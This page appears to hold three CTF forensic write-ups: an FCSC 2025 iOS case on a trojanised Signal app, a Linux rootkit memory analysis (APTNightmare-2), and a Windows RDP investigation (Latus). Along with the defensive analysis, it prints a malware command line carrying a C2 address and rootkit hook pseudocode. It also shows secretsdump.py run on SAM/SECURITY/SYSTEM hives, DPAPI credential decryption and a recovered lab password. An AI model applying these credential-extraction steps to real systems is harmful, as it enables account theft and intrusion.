first stop was plain old SMS / iMessage.\nBecause iLEAPP parses the sms.db for us, we can open the report and jump straight to the message table:\nIt can also be fed to Autopsy via the \u0026ldquo;Logical File Analysis\u0026rdquo; module. Autopsy scans all the files and, based on their headers (magic bytes), groups some of the media (JPEG, PNG, etc.) under the \u0026ldquo;User Content Suspected\u0026rdquo; tab, since the Access Path is located in HomeDomain/Media/DCIM/.... It therefore considers it to be user content (photo taken or imported).\nFlag : FCSC{511773550dca}\n⭐⭐ - iForensics - iNvisible #\rIt seems that a message could not be sent… Find the recipient of this message. The flag is in the format FCSC{}. For example, if the recipient is example@example.com: FCSC{example@example.com}.\nIn this case, it\u0026rsquo;s very quick: you can go straight to the DB sms.db. This is the database containing all conversations (iMessage and SMS), with the main tables message (headers, status, text, etc.) and handle (list of correspondents, numbers/addresses).\nDon\u0026rsquo;t fall into the trap of querying message only, for plain SMS you actually need the chat table.\nFlag : FCSC{kristy.friedman@outlook.com}\n⭐⭐ - iForensics - iBackdoor 1/2 #\rYou continue your analysis to find the backdoor on the phone. Eventually, you realize that an application has been compromised and that the phone was infected at the time of collection… Find the identifier of the compromised application and the process identifier (PID) of the malware.\nThe flag is in the format FCSC{|}. For example, if the compromised application is Example (com.example) and the PID is 1337: FCSC{com.example|1337}.\nHere we\u0026rsquo;ll have to use sysdiagnose (/sysdiagnose_and_crashes/private/var/mobile/Library/Logs/CrashReporter/DiagnosticLogs/sysdiagnose/sysdiagnose_2025.04.07_08-06-18-0700_iPhone-OS_iPhone_20A362).\nBut first, what is sysdiagnose? It\u0026rsquo;s an archive generated by iOS that automatically gathers system logs, crash reports, network status and configuration information at the time of capture. It\u0026rsquo;s mainly used to diagnose performance or stability problems by providing a complete snapshot of the device. But it is also very useful from a forensic point of view after a compromise.\nTo stay efficient I used the excellent EC-DIGIT-CSIRC/sysdiagnose toolkit https://github.com/EC-DIGIT-CSIRC/sysdiagnose.\n┌──(venv)─(kali㉿kali)-[~/sysdiagnose] └─$ sysdiag create /mnt/hgfs/backup/sysdiagnose_and_crashes/private/var/mobile/Library/Logs/CrashReporter/DiagnosticLogs/sysdiagnose/sysdiagnose_2025.04.07_08-06-18-0700_iPhone-OS_iPhone_20A362.tar.gz Sysdiagnose file has been processed: /mnt/hgfs/backup/sysdiagnose_and_crashes/private/var/mobile/Library/Logs/CrashReporter/DiagnosticLogs/sysdiagnose/sysdiagnose_2025.04.07_08-06-18-0700_iPhone-OS_iPhone_20A362.tar.gz Case \u0026#39;C39ZL6V1N6Y6_20250407_080618\u0026#39; created successfully from \u0026#39;/mnt/hgfs/backup/sysdiagnose_and_crashes/private/var/mobile/Library/Logs/CrashReporter/DiagnosticLogs/sysdiagnose/sysdiagnose_2025.04.07_08-06-18-0700_iPhone-OS_iPhone_20A362.tar.gz\u0026#39; Case successfully created:\nWe\u0026rsquo;ll directly use the \u0026ldquo;ps\u0026rdquo; parser. Running the ps parser gives us the full process list at capture time. That dump is invaluable:\nGlobal visibility: The ps.txt provides a snapshot of everything running on the iPhone (including executables hidden or launched by system services). Without this listing, malware hiding behind a misleading name or in a non-standard directory could go undetected.\nPrivilege anomalies: By looking at the user/uid and ppid columns, you can quickly spot when a third-party process (e.g. extracted from a third-party app) is running as root (UID 0). However, a normal app should never be granted this level of privileges without going through an official mechanism.\nSuspicious commands / args: The command field shows the executable and its arguments. Any unknown binary (as we\u0026rsquo;ll see later) or coded URL (Base64 or other) is immediately visible and can be decoded/inspected.\nTemporal context: With date/time (started, datetime) and performance fields (%cpu, %mem), we know if a process has started abnormally early (at boot) or if it is consuming resources to exfiltrate data, even if it remains at 0% to mask its activity.\nCorrelation: The ps.txt is integrated with all other dumps (network, open files, configurations). You can cross-reference: “X root process to IP Y” + “network connection to Y” + “files created in Z” to build an attack thread.\nWhat stands out?\nroot … 279 1 … /var/containers/Bundle/Application/…/Signal.app/mussel dGNwOi8vOTguNjYuMTU0LjIzNToyOTU1Mg== root … 330 1 … /var/containers/Bundle/Application/…/Signal.app/mussel dGNwOi8vOTguNjYuMTU0LjIzNToyOTU1Mg== root … 345 344 … /var/containers/Bundle/Application/…/Signal.app/mussel dGNwOi8vOTguNjYuMTU0LjIzNToyOTU1Mg== 1. \u0026ldquo;mussel\u0026rdquo; binary – Bundled inside Signal; not an iOS stock daemon.\n2. Running as root – Running with UID 0 (root) is highly suspicious for a third-party component.\n3. Base64 argument – dGNwOi8vOTguNjYuMTU0LjIzNToyOTU1Mg== is Base64 which, decoded, gives tcp://98.66.154.235:29552, TCP going to an external IP (C2)\n4. Classic spyware behaviour – Unknown root daemon + outbound C2 traffic = red flag lol\nAnswer : FCSC{org.whispersystems.signal|345}\n⭐⭐ - iForensics - iBackdoor 2/2 #\rNow that you know which application has been compromised, find out how the attacker retrieved the legitimate application prior to infection. You\u0026rsquo;ll need to find :\nThe identifier of the application used to retrieve the legitimate application; The path used to store the legitimate application; The date on which the legitimate application was uninstalled (in local time). The flag is in the format FCSC{||}. For example, if the application used is Example (com.example), the path is /private/var/tmp/test.xyz and the uninstall date is 2025-01-01 01:00:00: FCSC{com.example|/private/var/tmp/test.xyz|2025-01-01 01:00:00}.\nLet\u0026rsquo;s set the record straight:\nwe know that Signal is the app in question we know it was launched around 7:47AM we need to find the path to the app, what \u0026ldquo;retrieved\u0026rdquo; / installed the legitimate app and when it was uninstalled For this I went straight to mobileinstallation logs.\nIn fact, mobileinstallation is the iOS subsystem in charge of every install / update / uninstall.\nIn the JSON-formatted unified logs we get:\nprecise timestamps (timestamp + datetime) bundle IDs verbose uninstall events the occasional error detailing why something was removed. Bingo : // at 07:40:47-07:00, first uinstall of Signal { \u0026#34;datetime\u0026#34;: \u0026#34;2025-04-07T07:40:47.000000-07:00\u0026#34;, \u0026#34;event_type\u0026#34;: \u0026#34;MIClientConnection _uninstallIdentities\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;Uninstall requested by installcoordinationd ... for identity [org.whispersystems.signal]\u0026#34; } // at the same second, destruction of its containers: \u0026#34;message\u0026#34;: \u0026#34;Destroying container org.whispersystems.signal ... at /private/var/containers/Bundle/Application/1EC20F02-...\u0026#34; // at 07:43:55, uninstall of com.fiore.trolldecrypt { \u0026#34;datetime\u0026#34;: \u0026#34;2025-04-07T07:43:55.000000-07:00\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;Uninstalling identifier com.fiore.trolldecrypt\u0026#34; // then destroy the corresponding bundle container } We now know that the attacker used TrollDecrypt, an opensource utility designed for iOS devices equipped with TrollStore. It enables on-the-fly decryption of installed applications (IPAs protected by FairPlay DRM) directly on the device, without the need for jailbreak. Specifically, it :\nscans the list of apps installed on the iDevice via TrollStore decrypts the FairPlay binary of the targeted app packages the results in an exploitable .ipa file (for analysis, reinstallation, sideloading, etc.). TrollStore exploits a CoreTrust flaw to sign any IPA for life. TrollDecrypt uses this to launch the targeted app, dumps its memory and outputs a FairPlay free IPA. Hence the folder /Library/TrollDecrypt/decrypted/.\nI admit there would be a thousand clever ways to rotate, analyze and find the legitimate app\u0026rsquo;s storage path, but there are faster ways. In a CTF context, it counts!\nSimply look for a .ipa.\nThis gives a very brief timeline:\n07h40m47s: Signal uninstalled (MI log) 07h40-42m: dump → Signal_7.53_decrypted.ipa (fslisting) 07h43m55s: uninstall TrollDecrypt (log MI) 07h47mxxs: launch of repackaged IPA (unified log) We now have everything we need to create the flag.\nFlag : FCSC{com.fiore.trolldecrypt|/private/var/mobile/Library/TrollDecrypt/decrypted/Signal_7.53_decrypted.ipa|2025-04-07 07:40:47}\n⭐⭐⭐ - iForensics - iC2 #\rFind the name of the malicious tool deployed on the phone, as well as the protocol, IP address and communication port to the C2 server.\nThe flag is in the format FCSC{|||}. For example, if the tool is Cobalt Strike, the protocol TCP, the IP address 127.0.0.1 and the port 1337: FCSC{Cobalt Strike|TCP|127.0.0.1|1337}.\nSo I did some more research into TrollStore and related interesting news. I came across this article: https://idevicecentral.com/news/ios-malware-makes-trollstore-users-vulnerable-to-monitoring-file-extraction-remote-control-on-ios-14-ios-17/\nWe\u0026rsquo;ve already retrieved the protocol, IP and port earlier, so it\u0026rsquo;s simple:\nFlag : FCSC{SeaShell|TCP|98.66.154.235|29552}\n","date":"18 May 2025","externalUrl":null,"permalink":"/blog-cyber/en/posts/fcsc/","section":"Posts","summary":"Scenario #\rAs you pass through customs, the customs officer asks you to hand over your phone and its unlock code.","title":"FCSC 2025 - iOS Forensic","type":"posts"},{"content":"\rScenario #\rUpon completing the server recovery process, the IR team uncovered a labyrinth of persistent traffic, surreptitious communications, and resilient processes that eluded our termination efforts. It\u0026rsquo;s evident that the incident\u0026rsquo;s scope surpasses the initial breach of our servers and clients. As a forensic investigation expert, can you illuminate the shadows concealing these clandestine activities?\nSetup #\rFor this Sherlock challenge we’ll use:\nVolatility2 IDA We’ll also rely on this cheatsheet:\nhttps://downloads.volatilityfoundation.org/releases/2.4/CheatSheet_v2.4.pdf Volatility profile #\rFirst, we need to install Python 2, Volatility2, and add the required profile.\nA Volatility profile is a file containing structural information about the target OS. Think of it as a \u0026ldquo;map\u0026rdquo; that lets Volatility interpret how data is structured in a specific system’s memory.\nThis profile mainly contains two types of information:\nDefinitions of kernel data structures Kernel symbols (addresses of functions and variables) Installation:\nsudo apt install -y python2 python2-dev build-essential libdistorm3-dev libssl-dev libffi-dev zlib1g-dev curl -sS https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py sudo python2 get-pip.py sudo python2 -m pip install --upgrade pip setuptools wheel sudo python2 -m pip install distorm3 pycrypto openpyxl pillow yara-python git clone https://github.com/volatilityfoundation/volatility.git cd volatility python2 vol.py -h Profile setup:\ncp Ubuntu_5.3.0-70-generic_profile.zip ~/Documents/volatility/volatility/plugins/overlays/linux/ python2 vol.py --info | grep Linux Question 1 #\rWhat is the IP and port the attacker used for the reverse shell?\nWe’ll use the linux_netstat plugin to dump all network connections present at the time of the memory capture. We\u0026rsquo;ll redirect the output to a file for easier searching.\npython2 vol.py -f ~/Downloads/APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_netstat \u0026gt; netstat.txt On Linux, it’s most likely a messy Bash reverse shell and indeed:\nAnswer: 10.0.2.6:443\nQuestion 2 #\rWhat was the PPID of the malicious reverse shell connection?\nFirst we\u0026rsquo;ll try ``linux_pstree` :\npython2 vol.py -f ~/Downloads/APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_pstree | grep -C 5 3633 No PPID. Why? The linux_pstree plugin reconstructs the process tree based on a single source of truth: the system’s active task list (task_struct).\nhttps://makelinux.github.io/kernel/map/\nInstead, we’ll use the linux_psxview plugin, specifically designed to uncover hidden processes by aggregating multiple artifacts:\ntask_struct list: the same active task list used by linux_pstree pid hash table: the kernel’s hash table for fast PID lookups pslist: a process list derived from alternate memory structures kmem_cache: the kernel object cache, which may still reference hidden tasks d_path: filesystem paths from procfs, revealing exposed process directories thread_info: thread metadata that can surface otherwise unlinked tasks linux_psxview cross‑compares these sources and flags discrepancies—for example, when a PID appears in one structure but is missing from another.\npython2 vol.py -f ~/Downloads/APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_psxview \u0026gt; psxview.txt As expected, the parent is simply the PID immediately preceding it.\nBut why hide it? Given the scenario, we know we’re dealing with a rootkit. What likely happened is that the rootkit modified the task list (task_struct list) by \u0026ldquo;unlinking\u0026rdquo; its reverse‑shell process from the linked list. In practice, it manipulated the next and prev pointers so that its process would be ignored during list traversal.\nHowever, the rootkit failed to erase all traces of its existence. It neglected to modify one or more of the other structures monitored by linux_psxview.\nAs a result, linux_pstree, which relies solely on the task list, doesn’t see the malicious process, whereas linux_psxview, which checks multiple sources, detects it via the structures the rootkit overlooked.\nAnswer : 3632\nQuestion 3 #\rProvide the name of the malicious kernel module.\nFor this we’ll use the linux_check_modules plugin. But first, let’s clarify: what exactly is a kernel module, and how does it relate to rootkits?\nA kernel module is a piece of code that can be dynamically loaded and unloaded into a running OS kernel. This lets you extend functionality (like support for new hardware or file systems) without rebooting or fully rebuilding the kernel.\nRootkits operate at the Linux kernel level by injecting their own Loadable Kernel Modules (LKMs). These malicious modules can:\nintercept system calls to hide files, processes, or network connections establish persistent backdoors in the system disable certain kernel security features conceal their presence from standard system tools\n… and more. Now, the Volatility linux_check_modules plugin is designed to detect hidden LKMs by correlating multiple kernel data sources:\n1. Official modules list\nFirst, it inspects the kernel’s official modules list (modules.list). This circularly linked list—maintained by the kernel—contains every legitimately loaded module. You’d see the same list via lsmod.\n2. Kernel symbol table\nNext, it parses the kernel symbol table (/proc/kallsyms), which holds addresses for all kernel functions and variables, including those introduced by modules.\n3. .ko memory sections\nIt also scans the memory regions where .ko modules are typically loaded, hunting for the characteristic signatures of module code even if they’re not linked elsewhere.\n4. Hidden-module detection techniques\nThe primary check compares modules in the official list against those found in symbol or memory scans. Anything showing up in one source but missing from the official list is highly suspect. It examines the syscall table to see if original kernel functions have been hooked or replaced—a classic rootkit trick for intercepting kernel interactions. It verifies whether module function addresses point into non-standard or suspicious memory regions, which could indicate injected code. It analyzes module metadata (timestamp, name, author) for anomalies or inconsistencies. Okay, that’s cool—but how do rootkits actually hide in the first place?\nThere are several techniques, but the most common include:\nDKOM (Direct Kernel Object Manipulation):\nThey tweak in-memory kernel data structures to unlink their module from modules.list, yet keep it operational. Syscall hooks:\nThey swap out legitimate kernel functions for their own versions that filter or falsify results (e.g., a patched read that never shows certain files). Nameless modules:\nSome rootkits load modules with empty or special-character names to make discovery harder. Anyway, back to the question.\npython2 vol.py -f ~/Downloads/APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_check_modules The name \u0026ldquo;nfentlink\u0026rdquo; is an attempt to disguise a malicious module by impersonating \u0026ldquo;nfnetlink\u0026rdquo;, which is a legitimate Linux kernel module used for communication between kernel space and user space for networking and firewall functionality.\nAnswer: nfentlink\nQuestion 4 #\rWhat time was the module loaded?\nInitially, my approach was flawed. I tried to:\ntake the module load timestamp from dmesg via linux_dmesg take the boot timestamp from linux_pslist calculate the delta and voilà This would have worked if it were the first time the module was loaded. However, it had already been loaded previously. My method is inherently flawed—in an incident response scenario, it could lead you astray.\nIn the end, I cleared everything and asked myself, \u0026ldquo;Where can I find timestamps tied to past actions across multiple reboots?\u0026rdquo;\nThe system logs, of course. Specifically /var/log/kern.log or /var/log/syslog.log.\nTo grab those files, we’ll first enumerate them in the memory capture:\npython2 vol.py -f ~/Downloads/APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_enumerate_files \u0026gt; files.txt In fact we find: Next, to extract /var/log/kern.log we\u0026rsquo;ll :\npython2 vol.py -f ~/Downloads/APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_find_file -i 0xffff98ea5a732fa8 -O kern.log Answer : 2024-05-01 20:42:57\nQuestion 5 #\rWhat is the full path and name of the malicious kernel module file?\nSimilarly, we’ll check the enumerated files. First, we search for the module we identified, \u0026ldquo;nfentlink\u0026rdquo;.\ncat files.txt |grep nfentlink That doesn’t yield anything interesting.\nSo we’ll look for the module by its real name:\nWe’ll revisit the second file later.\nAnswer: /lib/modules/5.3.0-70-generic/kernel/drivers/net/nfnetlink.ko\nQuestion 6 #\rWhats the MD5 hash of the malicious kernel module file?\nJust extract the file and compute its hash:\npython2 vol.py -f ~/Downloads/APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_find_file -i 0xffff98ea266b5a68 -O nfnetlink.ko md5sum nfnetlink.ko Answer : 35bd8e64b021b862a0e650b13e0a57f7\nQuestion 7 #\rWhat is the full path and name of the legitimate kernel module file?\nLet’s return to the screenshot from question 5.\nAnswer : /lib/modules/5.3.0-70-generic/kernel/net/netfilter/nfnetlink.ko\nQuestion 8 #\rWhat is the single character difference in the author value between the legitimate and malicious modules?\nFirst, we’ll check the legitimate module using modinfo, which displays detailed information about a specific kernel module.\nmodinfo /lib/modules/6.11.2-amd64/kernel/net/netfilter/nfnetlink.ko.xz Next, we inspect the kernel module we extracted from the memory capture:\nmodinfo malicious-nfnetlink.ko Clearly, the malicious module\u0026rsquo;s author field lacks the character \u0026ldquo;i\u0026rdquo;.\nAnswer : i\nQuestion 9 #\rWhat is the name of initialization function of the malicious kernel module?\nTo answer this question I’ll use IDA. It’s definitely overkill—you could stick to gdb (gef\u0026gt;gdb), radare2, etc.\nSo let’s examine the functions:\nWe can clearly see that the initialization function is nfnetlink_init but also init_module. It becomes even more obvious with gef:\nGef shows both symbols at the exact same memory address. This reveals a deliberate camouflage technique used by the rootkit at the kernel level.\nThe malicious module leverages the standard init_module function (the mandatory entry point for any Linux kernel module) but has intentionally renamed it to nfnetlink_init to mimic the legitimate kernel module.\nExport symbols like init_module are essential for the Linux kernel to load a module, yet the attacker used compile-time tricks so that the same function carries two different names—one for module loading by the kernel and another for visual disguise.\nAnswer: nfnetlink_init\nQuestion 10 #\rThere is a function for hooking syscalls. What is the last syscall from the table?\nIn the nfnetlink_init function we see _sys_call_table = kallsyms_lookup_name(\u0026quot;sys_call_table\u0026quot;);:\n_sys_call_table = kallsyms_lookup_name(\u0026#34;sys_call_table\u0026#34;); This line uses kallsyms_lookup_name to fetch the address of the sys_call_table in kernel memory.\nsys_call_table is an array of pointers to the kernel’s syscall handler functions. By modifying this table, the attacker redirects syscalls to malicious functions.\nNext, we’ll inspect the data table in the .rodata section (the read-only data and string section).\nThis table holds references to symbols used by the malicious module for various manipulations.\naX64SysGetdents db \u0026#39;_x64_sys_getdents64\u0026#39;,0 aX64SysGetdents db \u0026#39;_x64_sys_getdents\u0026#39;,0 aX64SysKill db \u0026#39;_x64_sys_kill\u0026#39;,0 These strings correspond to syscall function symbols that the module intends to hook or override.\nThese functions belong to the Linux kernel’s syscall API and, in this instance, are being intercepted or redirected.\nAnswer: __x64_sys_kill\nQuestion 11 #\rWhat signal number is used to hide the process ID (PID) of a running process when sending it?\nSo let’s take a look at the hook_kill function:\nWhat immediately stands out is:\ncmp dword ptr [rdi+68h], 64 as well as the hide_pid call.\nNow let’s view the pseudocode generated by IDA:\nif ( (*(DWORD *)(a1 + 104)) != 64 ) return ((__int64 (*) (void))orig_kill()); a1 + 104: this accesses the signal number passed to the kill() call. The field at address a1 + 104 corresponds to the signal value. (*(DWORD *)(a1 + 104)) != 64: this condition checks if the signal is not equal to 64. If the signal isn’t 64, the function calls orig_kill (the original, pre-hook syscall) to continue normal kernel execution. Otherwise it invokes hide_pid: sprintf(hide_pid, \u0026#34;%d\u0026#34;, *((QWORD *)(a1 + 112))); sprintf(hide_pid, \u0026quot;%d\u0026quot;, ...): here sprintf formats and passes the PID into hide_pid, suggesting the module uses this PID to remove the process from /proc, system directories, or other kernel data structures. hide_pid: the function responsible for hiding a process, preventing its visibility. %d: the format specifier for an integer (the PID). Answer: 64\nLab finished!\n","date":"20 April 2025","externalUrl":null,"permalink":"/blog-cyber/en/posts/aptnightmare2/","section":"Posts","summary":"Scenario #\rUpon completing the server recovery process, the IR team uncovered a labyrinth of persistent traffic, surreptitious communications, and resilient processes that eluded our termination efforts.","title":"APTNightmare-2","type":"posts"},{"content":"","date":"20 April 2025","externalUrl":null,"permalink":"/blog-cyber/en/tags/linux/","section":"Tags","summary":"","title":"Linux","type":"tags"},{"content":"\rScénario #\rOur customer discovered illegal RDP sessions without Privileged Access Management (PAM) in their system on June 28. They collected evidence on a server they suspected was an intermediary server to move laterally to others. Even though the attacker deleted the event log, I believe the few remaining artifacts are enough to help confirm the attack flow and trace the attacker\u0026rsquo;s behavior.\nSetup #\rFor this Sherlock scenario, we\u0026rsquo;ll be using:\nZimmerman Tools (EvtxECmd, Registry Explorer, Timeline Explorer, PECmd, WxTCmd…) Impacket (secretsdump.py) NirSoft DataProtectionDecryptor ANSSI BMC-tools BSI-Bund RdpCacheStitcher We\u0026rsquo;ll also rely on some cheatsheets like the SANS FOR500 and the 13Cubed Windows Registry references:\nhttps://13cubed.s3.amazonaws.com/downloads/windows_registry_cheat_sheet.pdf Question 1 #\rWhen was the last failed logon attempt using emman.t user? (UTC)\nFirst, we need to confirm if the event logs were actually wiped as the scenario suggests. To do that, we\u0026rsquo;ll use two of Zimmerman\u0026rsquo;s tools, EvtxECmd and Timeline Explorer, to see if we can find any relevant records.\nEvtxECmd.exe -d \u0026#34;C:/C___NONAME [NTFS]\\[root]\\Windows\\System32\\winevt\\Logs\u0026#34; --csv \u0026#34;C:\\Users\\username\\Desktop\\HTB\\latus\u0026#34; We look for Event ID 4625 (Account failed to log on), but there is nothing relevant.\nAnd indeed, we can see that the logs were cleared:\nWe still have a shot at recovering them if we have VSS (Volume Shadow Copy).\nVolume Shadow Copy Service (VSS) is a Windows feature that creates snapshots of the disk state at a given point in time. If VSS snapshots are available, we can potentially recover older versions of deleted or altered files, including event logs. So even if an attacker cleared the logs on the live system, we might still recover them from a VSS snapshot.\nUnfortunately, after checking, we don\u0026rsquo;t have any VSS. So we have to rely on the Registry.\nTo do that, we\u0026rsquo;ll use another Zimmerman tool called Registry Explorer.\nWe\u0026rsquo;ll look into the SAM registry hive. Specifically, in SAM\\Domains\\Account\\Users, where we can find artifacts like:\nlast login time last incorrect password last password change login counts group membership account creation time, etc. So we load the file C___NONAME [NTFS]\\[root]\\Windows\\System32\\config\\SAM into Registry Explorer:\nAnd sure enough, we can see the \u0026ldquo;Last Incorrect Password\u0026rdquo; entry.\nAnswer: 2024-06-26 07:24:35\nQuestion 2 #\rWhat are the first 3 IP addresses that emman.t connected to using Remote Desktop (RDP)?\nTo answer this, we look at NTUSER.dat. This is the registry hive located in the user\u0026rsquo;s profile folder, containing personal settings and desktop environment preferences.\nWhenever a user logs on, Windows loads this hive to apply their specific settings (application configs, activity history, etc.).\nWe\u0026rsquo;re particularly interested in HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client because that\u0026rsquo;s where RDP parameters and a list of servers the user has connected to via RDP are stored.\nSo we load the user\u0026rsquo;s NTUSER.dat into Registry Explorer and navigate to the relevant path:\nAnswer: 192.168.86.250,192.168.25.128,192.168.25.131\nQuestion 3 #\rWhat is the destination username used to remote desktop to for the first time on 2024-06-20 16:01:05 UTC?\nWe can already see this in the screenshot from Question 2.\nAnswer: tommyxiaomi\nQuestion 4 #\rWhat is the destination IP address of the last Remote Desktop (RDP) session?\nSame.\nAnswer: 192.168.70.133\nQuestion 5 #\remman.t is very careless in always saving RDP credentials to connect to other hosts, so we believe that attacker somehow leaked them. Please confirm credentials of the server with ip 192.168.70.133 that was leaked?\nThis question is quite an interesting little challenge.\nFirst, let\u0026rsquo;s get straight to the point: where do we find RDP credentials? When you connect via Microsoft\u0026rsquo;s built-in RDP client, the app offers to save your credentials:\nWindows stores these credentials in the Credential Manager to keep them \u0026ldquo;secure.\u0026rdquo; When a user selects \u0026ldquo;Remember my credentials\u0026rdquo; during an RDP connection, the creds are saved to the user\u0026rsquo;s folder, here:\nC:\\Users\\emman.t\\AppData\\Local\\Microsoft\\Credentials.\nCredential Manager relies on DPAPI (Data Protection API) to encrypt the authentication data. The API is pretty straightforward:\nDPAPI_IMP BOOL CryptProtectData( [in] DATA_BLOB *pDataIn, [in, optional] LPCWSTR szDataDescr, [in, optional] DATA_BLOB *pOptionalEntropy, [in] PVOID pvReserved, [in, optional] CRYPTPROTECT_PROMPTSTRUCT *pPromptStruct, [in] DWORD dwFlags, [out] DATA_BLOB *pDataOut ); DPAPI is widely used by Microsoft and other apps like Chrome, Edge, etc. to store passwords and various secrets.\nDPAPI works with masterkeys, which are used to encrypt data protected by DPAPI. Each masterkey is itself encrypted using either a derivative of the user\u0026rsquo;s password or the DPAPI system key.\nThese masterkeys are stored in:\nFor the user:\nC:\\Users\\\u0026lt;user\u0026gt;\\AppData\\Roaming\\Microsoft\\Protect\\\u0026lt;SID\u0026gt; For the system:\nC:\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18 They are:\nAutomatically renewed every 3 months or whenever a user password changes. Cached (temporarily stored in plaintext) inside the LSASS process (handy for memory forensics or pentests). Here\u0026rsquo;s how the DPAPI mechanism works:\nIn the center is the masterkey, the main key used by DPAPI to encrypt/decrypt secrets.\nThis Masterkey is itself encrypted and protected. Depending on the situation, it can be decrypted by different keys:\nThe NT hash of a domain user account password. The SHA1 hash of a local user account password. A machine key called Domain Backup Key in Active Directory environments, allowing decryption of masterkeys without having the user\u0026rsquo;s password, if you have the right privileges. Once the Masterkey is decrypted with any of those keys, it\u0026rsquo;s used to derive a Session Key—that\u0026rsquo;s what actually encrypts/decrypts the data stored by DPAPI.\nTo decrypt DPAPI-protected data, we can use plenty of tools:\nOn a live system: LaZagne pypykatz (dpapi module) mimikatz SharpDPAPI Offline (after grabbing the needed files): pypykatz (dpapi module) dpapi.py (impacket) mimikatz SharpDPAPI dpapilab-ng diana If you\u0026rsquo;d like to dig deeper into DPAPI, check out this post from Synacktiv (the explanation above is based on it): Windows secrets extraction – a summary\nNow that we have the theory, how do we apply it to our case? I decided to use:\nImpacket (secretsdump.py) NirSoft DataProtectionDecryptor The secretsdump.py script lets us retrieve the user\u0026rsquo;s password so we can decrypt DPAPI secrets:\nsecretsdump.py -sam \u0026#34;C:\\C___NONAME [NTFS]\\[root]\\Windows\\System32\\SAM\u0026#34; --security \u0026#34;C:\\C___NONAME [NTFS]\\[root]\\Windows\\System32\\SECURITY\u0026#34; --system \u0026#34;C:\\C___NONAME [NTFS]\\[root]\\Windows\\System32\\SYSTEM\u0026#34; LOCAL Great, we\u0026rsquo;ve got the user\u0026rsquo;s password hash—so we can brute-force it:\nOnce we have the password, we can decrypt the credentials using DataProtectionDecryptor:\nThere\u0026rsquo;s also an unintentional way to discover the user\u0026rsquo;s password:\nIt turns out if we look into the PowerShell command history, we can see where the challenge creator set up these user accounts:\nAnswer: Administrator:C@mv@0s3rv3r\nQuestion 6 #\rWhen was the last time the Remote Desktop Connection application was executed? (UTC)\nTo answer this, we\u0026rsquo;ll look into Prefetch artifacts.\nPrefetch is a mechanism designed to speed up the launch of frequently used applications by caching certain data from previous executions. Windows stores these details in .pf files under: C:\\Windows\\Prefetch\\.\nEach .pf file contains:\nThe executable name The number of times the application has been launched Timestamps of the last execution Paths of associated files and libraries loaded during the process startup In the case of an RDP connection, the executable is usually MSTSC.EXE. Analyzing its corresponding Prefetch file (MSTSC.EXE-XXXXXX.pf) can reveal if an RDP connection was initiated from this machine and the exact time it was launched.\nTo load them into Timeline Explorer, we first need to parse them using PECmd:\nPECmd.exe -d \u0026#34;C:\\___NONAME [NTFS]\\[root]\\Windows\\Prefetch\u0026#34; --csv \u0026#34;C:\\Users\\username\\Desktop\\HTB\\latus\u0026#34; And indeed, we can see MSTSC.exe launch data:\nAnswer: 2024-06-28 13:56:48\nQuestion 7 #\rWhen was the last time the Remote Desktop Connection application was terminated? (UTC)\nFirst, we look into UserAssist (within the NTUSER.dat registry hive) under: NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\.\nThis key keeps track of the user\u0026rsquo;s application activity, including:\nThe number of times a program was launched The exact time the application was last run The exact time it was closed/terminated (last process end) These details are stored in subkeys encoded with ROT13, but Registry Explorer conveniently decodes them:\nWhat immediately stands out is the discrepancy between the \u0026ldquo;Last Executed\u0026rdquo; value from UserAssist and the \u0026ldquo;Last Run\u0026rdquo; data in Prefetch.\nWhy the difference between Prefetch and UserAssist?\nPrefetch (.pf): Logs executions at the process level (mstsc.exe). Increments its count each time the process is loaded into memory, regardless of how it\u0026rsquo;s launched. UserAssist (registry): Only records executions triggered by direct user interaction (e.g., clicking an icon, using the Start Menu, typing in search, using a shortcut). Does not necessarily count indirect executions (command line, auto-start, scripts, etc.). So, in this context, UserAssist alone doesn\u0026rsquo;t give us the correct last close time.\nNext, we turned to the BAM key (HKLM\\SYSTEM\\CurrentControlSet\\Services\\bam\\UserSettings\\) which explicitly tracks the lifetime of applications.\nBAM keeps a precise record for each executable, including:\nThe last time the app was executed (process start) The exact time it was closed (process termination) For more details on RDP artifacts, check out:\nhttps://www.thedfirspot.com/post/lateral-movement-remote-desktop-protocol-rdp-artifacts\nAnswer: 2024-06-28 14:01:26\nQuestion 8 #\rHow long did the penultimate RDP session last?\nWe checked the ActivitiesCache.db:\nAfter loading it into Timeline Explorer, we can clearly see the various RDP session durations:\nFor some unknown reason, the answer is off by -1 second.\nAnswer: 00:11:42\nQuestion 9 #\rWhen did the attacker disconnect the last Remote Desktop (RDP) session? (UTC)\nFor this, we look at the \u0026ldquo;Default.rdp\u0026rdquo; file in the user\u0026rsquo;s ...\\Documents\\ directory. Windows automatically generates this file whenever you connect via MSTSC.\nIt can include:\nThe IP address or hostname of the last RDP connection The username used to connect Graphics settings (resolution, color depth, etc.) Local resource sharing options (clipboard, local drives, printers, etc.) Performance settings (visual quality, compression, etc.) It also shows us when the file was last modified:\nAnswer: 2024-06-28 13:51:03\nQuestion 10 #\rWhat is the size of the remote desktop configured?\nWe go back to Default.rdp and find:\nAnswer: 1920:1080\nQuestion 11 #\rWhat tool did attacker use to discover the network after moving laterally to 192.168.70.133?\nTo figure this out, we need to look at the RDP bitmap cache.\nWhen investigating sessions that used Windows Remote Desktop Protocol (RDP), the RDP bitmap cache is a commonly overlooked but very useful artifact.\nThis cache improves RDP performance by storing screen sections locally. If part of the screen hasn\u0026rsquo;t changed, the system can pull it from the local cache instead of fetching it again, speeding up the user\u0026rsquo;s experience.\nFrom a forensic standpoint, the bitmap cache can reveal important clues about the user\u0026rsquo;s on-screen activity: which windows were open, displayed content, and actions taken during the session.\nFor more details, check out: 